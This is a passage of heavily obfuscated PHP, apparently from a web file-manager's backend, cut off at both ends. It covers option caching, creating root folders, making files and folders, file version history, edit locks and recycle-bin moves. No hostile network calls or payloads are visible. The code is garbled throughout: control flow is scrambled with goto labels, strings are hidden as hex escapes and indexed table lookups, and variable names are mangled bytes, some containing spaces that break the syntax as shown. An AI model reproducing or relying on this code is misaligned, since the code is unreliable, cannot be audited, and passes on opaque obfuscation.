array_merge($C”Ë®—Ó, $AÂ†âöÜš); $AÂ†âöÜš[$dÀ©¨§ƒÊô[107]] = time(); goto Bƒ¢³Ğ¬¡¹; aÔÏŒ®µ«: } public function remove($a»…®¼×©É) { return Model($this->modelType)->remove($_SERVER[úÎü][380] . $a»…®¼×©É, $this->optionType); } public function clear() { $DÄ®‚‹›­î =& $_SERVER[úÎü]; Model($this->modelType)->remove($DÄ®‚‹›­î[381], $this->optionType . $DÄ®‚‹›­î[382]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($eĞè™±åÆ, $b‡–µ³Ç®) { if (!$b‡–µ³Ç®) { return !1; } $bÄ¢ŞêÉï = $this->listData(); $bÄ¢ŞêÉï = array_to_keyvalue($bÄ¢ŞêÉï, $eĞè™±åÆ); return isset($bÄ¢ŞêÉï[$b‡–µ³Ç®]) ? $bÄ¢ŞêÉï[$b‡–µ³Ç®] : !1; } public function findByName($C²¡Ñƒõè) { return $this->findByKey($_SERVER[úÎü][28], $C²¡Ñƒõè); } protected function resetData($eÍÊİ·ÙÆÉ) { $AÄÎÅ÷Ç =& $_SERVER[úÎü]; $eÍÊİ·ÙÆÉ = is_array($eÍÊİ·ÙÆÉ) ? $eÍÊİ·ÙÆÉ : array(); $bÆ°‰¨¹° = array(); for ($AğÄ™öÓäá = 0; $AğÄ™öÓäá < count($eÍÊİ·ÙÆÉ); $AğÄ™öÓäá++) { $bÆ°‰¨¹°[$AÄÎÅ÷Ç[380] . $eÍÊİ·ÙÆÉ[$AğÄ™öÓäá][$AÄÎÅ÷Ç[383]]] = $eÍÊİ·ÙÆÉ[$AğÄ™öÓäá]; } return Model($this->modelType)->set($bÆ°‰¨¹°, !1, $this->optionType); } private function getAutoName($b·®¬›÷×Ú) { $b™¼ò‰Š¾é = array_to_keyvalue($this->listData(), $_SERVER[úÎü][28]); if (!$b™¼ò‰Š¾é || !isset($b™¼ò‰Š¾é[$b·®¬›÷×Ú])) { return $b·®¬›÷×Ú; } for ($c¦á—”• = 1; $c¦á—”• < count($b™¼ò‰Š¾é); $c¦á—”•++) { $e²‹²¶’ÛÁ = $b·®¬›÷×Ú . "\x28{$c¦á—”•}\51"; if (!isset($b™¼ò‰Š¾é[$e²‹²¶’ÛÁ])) { return $e²‹²¶’ÛÁ; } } return $e²‹²¶’ÛÁ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($EÎµµî‹Õº = false, $DçÅ¦®æåÚ = '', $Dºë ›Õ¨¥ = false) { goto E¨¶à‡ˆ—; b®ß·ºİñ³: $this->cacheSet($DçÅ¦®æåÚ, $eÕËÃ¾Ë¯Ñ); $eÕËÃ¾Ë¯Ñ = array_merge($E¢ˆÌÚ†Ü, $eÕËÃ¾Ë¯Ñ); return $EÎµµî‹Õº ? $eÕËÃ¾Ë¯Ñ[$EÎµµî‹Õº] : $eÕËÃ¾Ë¯Ñ; goto dë‘ËææĞÆ; BÛØ‚ÃÍİğ: $eÕËÃ¾Ë¯Ñ = $this->where($Få¨‡ÕÅ£)->select(); $eÕËÃ¾Ë¯Ñ = array_to_keyvalue($eÕËÃ¾Ë¯Ñ, $B‚ëâÑ‡ÆŠ[89], $B‚ëâÑ‡ÆŠ[366]); foreach ($eÕËÃ¾Ë¯Ñ as $Däñ›‹òé => $F‹ÚŞ·Šè») { if ($Dºë ›Õ¨¥ || in_array($Däñ›‹òé, $this->jsonField)) { $eÕËÃ¾Ë¯Ñ[$Däñ›‹òé] = json_decode($F‹ÚŞ·Šè», !0); } } goto b®ß·ºİñ³; E¨¶à‡ˆ—: $B‚ëâÑ‡ÆŠ =& $_SERVER[úÎü]; $eÕËÃ¾Ë¯Ñ = $this->cacheGet($DçÅ¦®æåÚ); $E¢ˆÌÚ†Ü = $this->optionDefault($DçÅ¦®æåÚ); goto BÖØ·Ûƒ¡…; BÖØ·Ûƒ¡…: $E¢ˆÌÚ†Ü = is_array($E¢ˆÌÚ†Ü) ? $E¢ˆÌÚ†Ü : array(); if (is_array($eÕËÃ¾Ë¯Ñ)) { $eÕËÃ¾Ë¯Ñ = array_merge($E¢ˆÌÚ†Ü, $eÕËÃ¾Ë¯Ñ); return $EÎµµî‹Õº ? isset($eÕËÃ¾Ë¯Ñ[$EÎµµî‹Õº]) ? $eÕËÃ¾Ë¯Ñ[$EÎµµî‹Õº] : null : $eÕËÃ¾Ë¯Ñ; } $Få¨‡ÕÅ£ = $this->filterWhere(array($B‚ëâÑ‡ÆŠ[29] => $DçÅ¦®æåÚ)); goto BÛØ‚ÃÍİğ; dë‘ËææĞÆ: } public function set($aµâïÆï©É, $A»èó¿õ‚ = false, $F¦Öæ¾¤Ñ  = '') { goto c×™¢Š¥Ìø; Fø²ìáñ´¸: return $this->addAll($A‰øÀœ Î, array(), !0); goto FÑÑ“óé£æ; c×™¢Š¥Ìø: $e˜†ã‹‰­Í =& $_SERVER[úÎü]; $this->cacheRemove($F¦Öæ¾¤Ñ ); $A‰øÀœ Î = array(); goto cÚ‚ñ¼êØí; cÚ‚ñ¼êØí: $c¿¢‹ŒÌ‚Ç = is_array($aµâïÆï©É) ? $aµâïÆï©É : array($aµâïÆï©É => $A»èó¿õ‚); foreach ($c¿¢‹ŒÌ‚Ç as $D•¿Õ÷‰ => $a´¹ĞÓ¾ôÒ) { if (is_array($a´¹ĞÓ¾ôÒ)) { $a´¹ĞÓ¾ôÒ = json_encode_force($a´¹ĞÓ¾ôÒ); } $this->checkLength($a´¹ĞÓ¾ôÒ, !1, $this->tableName . $e˜†ã‹‰­Í[4] . $aµâïÆï©É); $a´¹ĞÓ¾ôÒ = self::textEncode($a´¹ĞÓ¾ôÒ); $c¿¢‹ŒÌ‚Ç = array($e˜†ã‹‰­Í[29] => $F¦Öæ¾¤Ñ , $e˜†ã‹‰­Í[89] => $D•¿Õ÷‰, $e˜†ã‹‰­Í[366] => $a´¹ĞÓ¾ôÒ); $A‰øÀœ Î[] = $this->filterWhere($c¿¢‹ŒÌ‚Ç); } if (!$A‰øÀœ Î) { return !0; } goto Fø²ìáñ´¸; FÑÑ“óé£æ: } protected function optionDefault($fš§ì•“Ò = '') { return !1; } public function setDeep($cËÄ–Ä¯Ê, $cß‹é³›ºÔ = false, $CÁ¸Œƒì© = '') { $BÁ›Ç‚¿Àğ = explode($_SERVER[úÎü][91], $cËÄ–Ä¯Ê); $c¾…¯ ®Àª = $this->get(); array_set_value($c¾…¯ ®Àª, $cËÄ–Ä¯Ê, $cß‹é³›ºÔ); $this->set($BÁ›Ç‚¿Àğ[0], $c¾…¯ ®Àª[$BÁ›Ç‚¿Àğ[0]], $CÁ¸Œƒì©); } public function remove($F¡Îæ¢´±¸, $eöŸ²º¿¦ = '') { $f†°óßÃìÕ =& $_SERVER[úÎü]; $this->cacheRemove($eöŸ²º¿¦); $cšù×«Ä§Û = $this->filterWhere(array($f†°óßÃìÕ[89] => $F¡Îæ¢´±¸, $f†°óßÃìÕ[29] => $eöŸ²º¿¦)); if (is_null($F¡Îæ¢´±¸)) { unset($cšù×«Ä§Û[$f†°óßÃìÕ[89]]); } return $this->where($cšù×«Ä§Û)->delete(); } public function cacheSet($e¼Œ†ŒæšÅ, $bŸ†Íéî´İ = false) { return Cache::set($this->cacheKey($e¼Œ†ŒæšÅ), $bŸ†Íéî´İ); } public function cacheGet($E÷àÚµŒÛ‚) { return Cache::get($this->cacheKey($E÷àÚµŒÛ‚)); } public function cacheRemove($dªÑ†àË§Ã) { return Cache::remove($this->cacheKey($dªÑ†àË§Ã)); } protected function filterWhere($F¹—å…™…) { return $F¹—å…™…; } protected function cacheKey($aËÅó¨¡ê) { return $aËÅó¨¡ê; } } goto FŠâ±éëöˆ; Bïª…Ğæï : class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($EĞ“Ø…ñí†) { $D¢ù¬×ìÃ =& $_SERVER[úÎü]; $F…£Æì® = Model($D¢ù¬×ìÃ[491])->where(array($D¢ù¬×ìÃ[1477] => $EĞ“Ø…ñí†))->find(); $e¶¡‚Š†øà = $this->_mkdirRoot(SourceModel::TYPE_USER, $EĞ“Ø…ñí†, $F…£Æì®[$D¢ù¬×ìÃ[28]]); $this->userDesktopAdd($e¶¡‚Š†øà); return $e¶¡‚Š†øà; } public function userDesktopAdd($FºõÜù®•‚) { $Eö˜ÏóÉ¶º =& $_SERVER[úÎü]; $BÖ£¦à·õ÷ = LNG($Eö˜ÏóÉ¶º[1904]); $AÍÌ¶’¡˜º = $this->mkdir($FºõÜù®•‚, $BÖ£¦à·õ÷); $this->metaSet($AÍÌ¶’¡˜º, $Eö˜ÏóÉ¶º[1905], $Eö˜ÏóÉ¶º[83]); $this->metaSet($FºõÜù®•‚, $Eö˜ÏóÉ¶º[1906], $AÍÌ¶’¡˜º); } public function groupRootAdd($a ƒ¿¶™š) { $cšÇ¼óê›à =& $_SERVER[úÎü]; $e§¶©ã£†ó = Model($cšÇ¼óê›à[475])->where(array($cšÇ¼óê›à[1725] => $a ƒ¿¶™š))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $a ƒ¿¶™š, $e§¶©ã£†ó[$cšÇ¼óê›à[28]]); } public function systemRootPathAdd($BÀâ£‹¤‚Ÿ) { if ($BÀâ£‹¤‚Ÿ != $_SERVER[úÎü][1134]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $BÀâ£‹¤‚Ÿ); } public function userRootRemove($aÀƒçô–¶ï) { $BÉŠš…’ÀŒ = $this->sourceRoot(SourceModel::TYPE_USER, $aÀƒçô–¶ï); if (!$BÉŠš…’ÀŒ) { return; } $this->remove($BÉŠš…’ÀŒ, !1); } public function groupRootRemove($c©™ÊÄù™) { $A©·¶¾ÌÏƒ = $this->sourceRoot(SourceModel::TYPE_GROUP, $c©™ÊÄù™); if (!$A©·¶¾ÌÏƒ) { return; } $this->remove($A©·¶¾ÌÏƒ, !1); } private function _mkdirRoot($fÖ’Ó¸¹, $FëÄçĞ£å¡, $dá¥íÆ©) { goto cÀÑæœ ±ò; Aíˆ‡Ù²æ­: $B™Ü•œÔˆÇ = $this->add($b÷‹çí¨Ñ¢); $fÛÎÁÑ„”ª = array($b Ã¤ÁÈ¥„[544] => short_id($B™Ü•œÔˆÇ)); $this->where(array($b Ã¤ÁÈ¥„[399] => $B™Ü•œÔˆÇ))->save($fÛÎÁÑ„”ª); goto aÒÉÊİÅ¼; aÒÉÊİÅ¼: CacheLock::unlock($d°Ö‘Á‡æ‚); return $B™Ü•œÔˆÇ; goto Bê …Ç…Ò; cÀÑæœ ±ò: $b Ã¤ÁÈ¥„ =& $_SERVER[úÎü]; $b÷‹çí¨Ñ¢ = array($b Ã¤ÁÈ¥„[384] => 0, $b Ã¤ÁÈ¥„[538] => $fÖ’Ó¸¹, $b Ã¤ÁÈ¥„[539] => $FëÄçĞ£å¡, $b Ã¤ÁÈ¥„[535] => 1, $b Ã¤ÁÈ¥„[540] => USER_ID, $b Ã¤ÁÈ¥„[541] => USER_ID, $b Ã¤ÁÈ¥„[536] => $b Ã¤ÁÈ¥„[33], $b Ã¤ÁÈ¥„[542] => $b Ã¤ÁÈ¥„[487], $b Ã¤ÁÈ¥„[412] => 0, $b Ã¤ÁÈ¥„[537] => 0, $b Ã¤ÁÈ¥„[436] => 0, $b Ã¤ÁÈ¥„[543] => $b Ã¤ÁÈ¥„[33]); if ($BéÌŠ‚ÃÒ = $this->where($b÷‹çí¨Ñ¢)->find()) { return $BéÌŠ‚ÃÒ[$b Ã¤ÁÈ¥„[385]]; } goto c¡ŠŞÂ²¼Û; c¡ŠŞÂ²¼Û: $d°Ö‘Á‡æ‚ = "\115\x6f\x64\x65\x6c\x53\157\x75\162\x63\145\x2e\x6d\x6b\144\151\x72\122\x6f\x6f\164\56{$fÖ’Ó¸¹}\56{$FëÄçĞ£å¡}\56" . $dá¥íÆ©; CacheLock::lock($d°Ö‘Á‡æ‚); $b÷‹çí¨Ñ¢[$b Ã¤ÁÈ¥„[28]] = $dá¥íÆ©; goto Aíˆ‡Ù²æ­; Bê …Ç…Ò: } private function sourceRoot($DÀö÷ˆ½âĞ, $C“â¦…‚‡, $d¡‚÷„õ = false) { $A”Ø·ğ—‹ï =& $_SERVER[úÎü]; $aĞêèš “á = array($A”Ø·ğ—‹ï[384] => 0, $A”Ø·ğ—‹ï[538] => $DÀö÷ˆ½âĞ, $A”Ø·ğ—‹ï[539] => $C“â¦…‚‡); if ($cÉãµØõë = $this->where($aĞêèš “á)->find()) { return $d¡‚÷„õ ? $cÉãµØõë : $cÉãµØõë[$A”Ø·ğ—‹ï[385]]; } return !1; } public function sourceRootGroup($F Şó‡Öâ) { $eëæÈ¡±õ« =& $_SERVER[úÎü]; if (is_string($F Şó‡Öâ)) { $F Şó‡Öâ = array($F Şó‡Öâ); } $Aâ’âÈŠ‚ = array($eëæÈ¡±õ«[384] => 0, $eëæÈ¡±õ«[538] => SourceModel::TYPE_GROUP, $eëæÈ¡±õ«[539] => array($eëæÈ¡±õ«[7], $F Şó‡Öâ)); $c‚¤Ç©¯ = $this->listSource($Aâ’âÈŠ‚, 1000); return array_to_keyvalue($c‚¤Ç©¯[$eëæÈ¡±õ«[74]], $eëæÈ¡±õ«[473]); } public function mkfile($a‘Š‡„ê¸, $Eö‡¬ùÏäÛ, $FÃ°‘£ğÒ = '', $FÍáÄ–Õ–ñ = REPEAT_RENAME) { $aÈ»Î‡§ =& $_SERVER[úÎü]; $EÜ¤Ã†ëöŠ = Model($aÈ»Î‡§[560])->addFileByContent($FÃ°‘£ğÒ, $Eö‡¬ùÏäÛ); return $this->_createFileCall($a‘Š‡„ê¸, $Eö‡¬ùÏäÛ, $EÜ¤Ã†ëöŠ, $FÍáÄ–Õ–ñ, $aÈ»Î‡§[1171]); } public function addFile($FŠ¾¿ßøš¢, $bÊ‚…¹ªç, $E¢çš›öñ, $eáÚˆÁÆÔƒ = false, $BõäİÉäæÒ = REPEAT_RENAME) { $C¦¬å¸¥‚ = Model($_SERVER[úÎü][560])->addFile($bÊ‚…¹ªç, $E¢çš›öñ, $eáÚˆÁÆÔƒ); return $this->_createFileCall($FŠ¾¿ßøš¢, $E¢çš›öñ, $C¦¬å¸¥‚, $BõäİÉäæÒ); } public function addFileByFileID($eËì˜ñÜ†¾, $EÙ§ÅÂ÷¤í, $eèÆè¥’†í, $dàÚì¶¦¼£ = REPEAT_RENAME) { $CÏÓÈºÓºŒ =& $_SERVER[úÎü]; $B‹‰•Ûİ ö = Model($CÏÓÈºÓºŒ[560])->find($EÙ§ÅÂ÷¤í); Model($CÏÓÈºÓºŒ[560])->linkAdd($EÙ§ÅÂ÷¤í); return $this->_createFileCall($eËì˜ñÜ†¾, $eèÆè¥’†í, $B‹‰•Ûİ ö, $dàÚì¶¦¼£); } public function addFileByRemote($FµÅ±‚Õœ, $cÙÀğà°í˜, $AªÙù®•¡¾, $B‹£â = array(), $d¾æÇ¿¸ø¤ = REPEAT_RENAME) { $eŒ›Îƒ­½  = Model($_SERVER[úÎü][560])->addFileByRemote($cÙÀğà°í˜, $AªÙù®•¡¾, $B‹£â); return $this->_createFileCall($FµÅ±‚Õœ, $AªÙù®•¡¾, $eŒ›Îƒ­½ , $d¾æÇ¿¸ø¤); } private function _createFileCall($F¯Èº’ÑÔ, $F†Õ³èÎ¢, $aßÏ•ì¶²à, $eš¼¸Å²‚î, $Bô“»²Û†Ñ = "\x75\x70\x6c\x6f\141\x64") { goto Aœ±£†©Ä; Aœ±£†©Ä: $E£Õà³Î… =& $_SERVER[úÎü]; $dôïÒ‡¶ × = !1; $this->lockWriteStart($F¯Èº’ÑÔ, $F†Õ³èÎ¢); goto f¥×‘š·É; f¥×‘š·É: $a¤¥ÊßÀ¼ = $this->fileNameExist($F¯Èº’ÑÔ, $F†Õ³èÎ¢); $B–†§‚ƒ¸œ = $this->_createFile($F¯Èº’ÑÔ, $F†Õ³èÎ¢, $aßÏ•ì¶²à, $eš¼¸Å²‚î, $dôïÒ‡¶ ×); if (!$dôïÒ‡¶ ×) { Model($E£Õà³Î…[438])->remove($aßÏ•ì¶²à[$E£Õà³Î…[435]]); } goto fø„®¬º–ô; fø„®¬º–ô: if ($dôïÒ‡¶ × && $B–†§‚ƒ¸œ && $B–†§‚ƒ¸œ != $a¤¥ÊßÀ¼) { Model($E£Õà³Î…[1876])->eventCreate($B–†§‚ƒ¸œ, $Bô“»²Û†Ñ); } $this->lockWriteEnd($F¯Èº’ÑÔ, $F†Õ³èÎ¢); return $B–†§‚ƒ¸œ; goto e‹Ñ‰ìğÑ; e‹Ñ‰ìğÑ: } public function mkdir($Cº¶º†…, $BŠ×ìŒÉÕ’, $c«×Ş§©Ó§ = REPEAT_SKIP) { goto C‡ÑÉ¬Ø; C‡ÑÉ¬Ø: $e±Ü¥††ê¤ =& $_SERVER[úÎü]; $B“°áé—Øë = $this->sourceInfo($Cº¶º†…); if (!$B“°áé—Øë) { return !1; } goto C•Ú§˜óÂ; C•Ú§˜óÂ: $this->lockWriteStart($Cº¶º†…, $BŠ×ìŒÉÕ’); if ($c«×Ş§©Ó§ !== !1) { $e¼ÏÃ¹ğ†á = $this->fileNameExist($Cº¶º†…, $BŠ×ìŒÉÕ’); if ($e¼ÏÃ¹ğ†á && $c«×Ş§©Ó§ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Cº¶º†…, $BŠ×ìŒÉÕ’); return $e¼ÏÃ¹ğ†á; } $BŠ×ìŒÉÕ’ = $this->fileNameAuto($Cº¶º†…, $BŠ×ìŒÉÕ’, $c«×Ş§©Ó§); } $FêµœÛæ = array($e±Ü¥††ê¤[535] => 1, $e±Ü¥††ê¤[402] => $BŠ×ìŒÉÕ’, $e±Ü¥††ê¤[536] => $e±Ü¥††ê¤[33], $e±Ü¥††ê¤[436] => 0, $e±Ü¥††ê¤[537] => 0); goto F‹ƒÖë’ù; BÂÕ˜™É²İ: return $CÌ¡’†Û‚; goto E®–Èõƒè‘; F‹ƒÖë’ù: $CÌ¡’†Û‚ = $this->_addSoure($FêµœÛæ, $B“°áé—Øë); Model($e±Ü¥††ê¤[1876])->eventCreate($CÌ¡’†Û‚, $e±Ü¥††ê¤[1172]); $this->lockWriteEnd($Cº¶º†…, $BŠ×ìŒÉÕ’); goto BÂÕ˜™É²İ; E®–Èõƒè‘: } private function _createFile($a…ˆùó‡š±, $EîÜ„Ûìµ¡, $E®ÜŠ±ÚŠ, $eÑˆìù»½Ö, &$Eâ™¼Œİ) { goto DÉ¦è‘Æå; b¼ÒÍ¬£¼ä: if ($eÑˆìù»½Ö !== !1) { $D‡Üƒí•ŸÒ = $this->fileNameExist($a…ˆùó‡š±, $EîÜ„Ûìµ¡); } $Eâ™¼Œİ = !0; if ($eÑˆìù»½Ö && $D‡Üƒí•ŸÒ) { if ($eÑˆìù»½Ö == REPEAT_SKIP) { $Eâ™¼Œİ = !1; return $D‡Üƒí•ŸÒ; } else { if ($eÑˆìù»½Ö == REPEAT_REPLACE) { $cîñ…åİ¼— = $this->sourceInfo($D‡Üƒí•ŸÒ); $E’ÑÕÈóÛ = $this->fileHistory($cîñ…åİ¼—, $E®ÜŠ±ÚŠ[$A£¸÷÷£Øà[435]], $E®ÜŠ±ÚŠ[$A£¸÷÷£Øà[77]]); if (!$E’ÑÕÈóÛ) { $Eâ™¼Œİ = !1; } else { $this->folderSizeReset($a…ˆùó‡š±); } return $D‡Üƒí•ŸÒ; } else { $EîÜ„Ûìµ¡ = $this->fileNameAuto($a…ˆùó‡š±, $EîÜ„Ûìµ¡, $eÑˆìù»½Ö, !1); } } } goto c¼ù’Œê«¹; c¼ù’Œê«¹: $dË™îÑœ³£ = array($A£¸÷÷£Øà[535] => 0, $A£¸÷÷£Øà[402] => $EîÜ„Ûìµ¡, $A£¸÷÷£Øà[536] => get_path_ext($EîÜ„Ûìµ¡), $A£¸÷÷£Øà[436] => $E®ÜŠ±ÚŠ[$A£¸÷÷£Øà[435]], $A£¸÷÷£Øà[537] => $E®ÜŠ±ÚŠ[$A£¸÷÷£Øà[77]]); $bæÙ”¢±®œ = $this->_addSoure($dË™îÑœ³£, $cÊ”î„àå´); $this->folderSizeReset($a…ˆùó‡š±, intval($dË™îÑœ³£[$A£¸÷÷£Øà[77]])); goto DñÈñºİÙ; DÉ¦è‘Æå: $A£¸÷÷£Øà =& $_SERVER[úÎü]; $cÊ”î„àå´ = $this->sourceInfo($a…ˆùó‡š±); if (!$E®ÜŠ±ÚŠ || !$cÊ”î„àå´) { return !1; } goto b¼ÒÍ¬£¼ä; DñÈñºİÙ: return $bæÙ”¢±®œ; goto bª»„’ì˜…; bª»„’ì˜…: } protected function fileHistory($AäÍÔ•Å‚, $B´ëêÆéÂ, $D®«ÏåÂ ) { goto E°¸ÊˆÒÆÀ; AÉ‰Çà¸á¶: Model($dŒÙÃô¬ò[1907])->addHistory($AäÍÔ•Å‚); $d§Â¸Óİô = array($dŒÙÃô¬ò[541] => USER_ID, $dŒÙÃô¬ò[406] => time(), $dŒÙÃô¬ò[435] => $B´ëêÆéÂ, $dŒÙÃô¬ò[77] => $D®«ÏåÂ ); $this->where(array($dŒÙÃô¬ò[399] => $AäÍÔ•Å‚[$dŒÙÃô¬ò[385]]))->save($d§Â¸Óİô); goto eÜğ£‡·æ; E°¸ÊˆÒÆÀ: $dŒÙÃô¬ò =& $_SERVER[úÎü]; if ($AäÍÔ•Å‚[$dŒÙÃô¬ò[435]] == $B´ëêÆéÂ) { return !1; } $this->checkLock($AäÍÔ•Å‚[$dŒÙÃô¬ò[385]], $B´ëêÆéÂ); goto AÉ‰Çà¸á¶; eÜğ£‡·æ: $this->sourceCacheClear($AäÍÔ•Å‚[$dŒÙÃô¬ò[385]]); return !0; goto eÅ¹›ÖàÇ; eÅ¹›ÖàÇ: } public function checkLock($F’»—åìçù, $c±ÃŒšİñ†) { goto a»½òÄÏáİ; a­“’óìš: show_json(LNG($E‚§Ş¦ƒò[1910]) . $E‚§Ş¦ƒò[1911] . LNG($E‚§Ş¦ƒò[1912]) . $E‚§Ş¦ƒò[1913] . $E¹Œ·÷¬¦ . $E‚§Ş¦ƒò[1914], !1); goto A¼©îè©ñİ; dË¡™‘õ¸: $dñœÛ„ªÇİ = Session::get($E‚§Ş¦ƒò[1908]); $Fªˆ«çêÓ­ = substr($aÜÒİÔ‘…Á[$E‚§Ş¦ƒò[28]], 0, -1 - strlen($aÜÒİÔ‘…Á[$E‚§Ş¦ƒò[165]])) . $E‚§Ş¦ƒò[1437] . $dñœÛ„ªÇİ . $E‚§Ş¦ƒò[91] . $aÜÒİÔ‘…Á[$E‚§Ş¦ƒò[165]]; $bëˆ÷›ôôô = Model($E‚§Ş¦ƒò[560])->find($c±ÃŒšİñ†); goto b§äåêĞ¸Ô; a»½òÄÏáİ: $E‚§Ş¦ƒò =& $_SERVER[úÎü]; $aÜÒİÔ‘…Á = $this->pathInfo($F’»—åìçù); if (!$this->fileIsLock($aÜÒİÔ‘…Á, !0)) { return; } goto dË¡™‘õ¸; b§äåêĞ¸Ô: $this->_createFileCall($aÜÒİÔ‘…Á[$E‚§Ş¦ƒò[478]], $Fªˆ«çêÓ­, $bëˆ÷›ôôô, REPEAT_REPLACE, $E‚§Ş¦ƒò[1171]); $EñßïèÏÁ‰ = $aÜÒİÔ‘…Á[$E‚§Ş¦ƒò[433]][$E‚§Ş¦ƒò[498]]; $E¹Œ·÷¬¦ = $EñßïèÏÁ‰[$E‚§Ş¦ƒò[1909]] ? $EñßïèÏÁ‰[$E‚§Ş¦ƒò[1909]] : $EñßïèÏÁ‰[$E‚§Ş¦ƒò[28]]; goto a­“’óìš; A¼©îè©ñİ: } public function fileIsLock($A•ßí¼óƒ‹, $E¬¶Ê§„ = false) { goto c‘ôäÑã©ñ; c‘ôäÑã©ñ: $DöÚ´¾ê ¼ =& $_SERVER[úÎü]; if (!isset($A•ßí¼óƒ‹[$DöÚ´¾ê ¼[433]]) || !$A•ßí¼óƒ‹[$DöÚ´¾ê ¼[433]][$DöÚ´¾ê ¼[495]]) { return !1; } if ($A•ßí¼óƒ‹[$DöÚ´¾ê ¼[433]][$DöÚ´¾ê ¼[495]] != USER_ID) { return !0; } goto E××ø…¿¹; A¬†ŒíáÙº: return !1; goto CÈ¤œƒ‘ªÎ; E××ø…¿¹: $b„‚„â‰‚ = $GLOBALS[$DöÚ´¾ê ¼[6]][$DöÚ´¾ê ¼[84]][$DöÚ´¾ê ¼[496]]; if ($A•ßí¼óƒ‹[$DöÚ´¾ê ¼[433]][$DöÚ´¾ê ¼[497]] <= time() - $b„‚„â‰‚) { $this->metaSet($A•ßí¼óƒ‹[$DöÚ´¾ê ¼[385]], $DöÚ´¾ê ¼[495], null); $this->metaSet($A•ßí¼óƒ‹[$DöÚ´¾ê ¼[385]], $DöÚ´¾ê ¼[497], null); } if ($E¬¶Ê§„) { $this->metaSet($A•ßí¼óƒ‹[$DöÚ´¾ê ¼[385]], $DöÚ´¾ê ¼[497], time()); } goto A¬†ŒíáÙº; CÈ¤œƒ‘ªÎ: } private function _addSoure($eÇñ…îêÑ , $A™á‹“´ÓÙ) { goto eÈŸÀÕéî‹; eÈŸÀÕéî‹: $a¶‹Â¶º =& $_SERVER[úÎü]; $C‚Ç‚²Èö¸ = array($a¶‹Â¶º[538] => $A™á‹“´ÓÙ[$a¶‹Â¶º[387]], $a¶‹Â¶º[539] => $A™á‹“´ÓÙ[$a¶‹Â¶º[473]], $a¶‹Â¶º[540] => USER_ID, $a¶‹Â¶º[541] => USER_ID, $a¶‹Â¶º[384] => $A™á‹“´ÓÙ[$a¶‹Â¶º[385]], $a¶‹Â¶º[542] => $A™á‹“´ÓÙ[$a¶‹Â¶º[476]] . $A™á‹“´ÓÙ[$a¶‹Â¶º[385]] . $a¶‹Â¶º[47], $a¶‹Â¶º[412] => 0, $a¶‹Â¶º[543] => $a¶‹Â¶º[33]); $eÇñ…îêÑ  = array_merge($C‚Ç‚²Èö¸, $eÇñ…îêÑ ); goto DÆÑÅöÅÙ; bÏ¤Ò«¤: return $C„š¹­ºœ; goto EàÉÀê’¢Ö; DÆÑÅöÅÙ: $this->updateModifyTime($eÇñ…îêÑ [$a¶‹Â¶º[478]]); $B§ä¿ãĞ¦’ = $a¶‹Â¶º[1915] . $A™á‹“´ÓÙ[$a¶‹Â¶º[385]]; if (isset(self::$cacheChildList[$B§ä¿ãĞ¦’])) { unset(self::$cacheChildList[$B§ä¿ãĞ¦’]); } goto AĞã‰¡×±; F‚øªÒò±‹: $bß¿Ÿ«êìé = array($a¶‹Â¶º[544] => short_id($C„š¹­ºœ)); $this->where(array($a¶‹Â¶º[399] => $C„š¹­ºœ))->save($bß¿Ÿ«êìé); $this->setNamePinyin($C„š¹­ºœ, $eÇñ…îêÑ [$a¶‹Â¶º[28]]); goto bÏ¤Ò«¤; AĞã‰¡×±: static $E§‹«‚§£Ò = false; if (!$E§‹«‚§£Ò) { Hook::trigger($a¶‹Â¶º[525], $eÇñ…îêÑ ); $E§‹«‚§£Ò = !0; } $C„š¹­ºœ = $this->add($eÇñ…îêÑ ); goto F‚øªÒò±‹; EàÉÀê’¢Ö: } public function remove($B„Æ”‚¥ÕÙ, $CÈø¾·¹Œ = true) { goto d•¦×÷“ì; d•¦×÷“ì: $bÀ’ÉòÆ±¬ =& $_SERVER[úÎü]; $BÃ‚—•Ú§ƒ = $this->sourceInfo($B„Æ”‚¥ÕÙ); $Dœ…‰¿ò‰± = intval($BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[387]]) === self::TYPE_SYSTEM; goto CÉÙ­ÇîÅŞ; dÀ»Îç«æ¡: return $cëçÅöš®; goto CˆõöÅùÅ…; CÉÙ­ÇîÅŞ: $c½¸¢Ì—öò = Model($bÀ’ÉòÆ±¬[1484])->get($bÀ’ÉòÆ±¬[1916]) == $bÀ’ÉòÆ±¬[83]; if ($Dœ…‰¿ò‰± || $CÈø¾·¹Œ || !$c½¸¢Ì—öò) { return $this->removeNow($B„Æ”‚¥ÕÙ, $CÈø¾·¹Œ); } $C±÷õø‰Å˜ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto AÚ‡Ÿ²¹„; AÙçÄ½çœ…: CacheLock::unlock($f’šùéÜ‘ø); $this->metaSet($B„Æ”‚¥ÕÙ, $bÀ’ÉòÆ±¬[1924], $BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[478]]); $this->where(array($bÀ’ÉòÆ±¬[385] => $B„Æ”‚¥ÕÙ))->save(array($bÀ’ÉòÆ±¬[406] => time())); goto C…¾¶Û´ÄÛ; BØùÃïÊİª: CacheLock::lock($f’šùéÜ‘ø); $AÈŠ…‘…Üã = $this->fileNameExist($C±÷õø‰Å˜, $Eëé‡ÙÙ×Î); if (!$AÈŠ…‘…Üã) { $AÈŠ…‘…Üã = $this->mkdir($C±÷õø‰Å˜, $Eëé‡ÙÙ×Î, REPEAT_SKIP); $this->metaSet($AÈŠ…‘…Üã, $bÀ’ÉòÆ±¬[1920], $C­„á‹åÚĞ); $this->metaSet($AÈŠ…‘…Üã, $bÀ’ÉòÆ±¬[1921], $BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[473]]); if ($BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[478]] != 0) { $this->metaSet($AÈŠ…‘…Üã, $bÀ’ÉòÆ±¬[1922], _get($A³§„ô®çÂ, $bÀ’ÉòÆ±¬[1923])); } } goto AÙçÄ½çœ…; C…¾¶Û´ÄÛ: $this->recycleClear($BÃ‚—•Ú§ƒ); $cëçÅöš® = $this->move($B„Æ”‚¥ÕÙ, 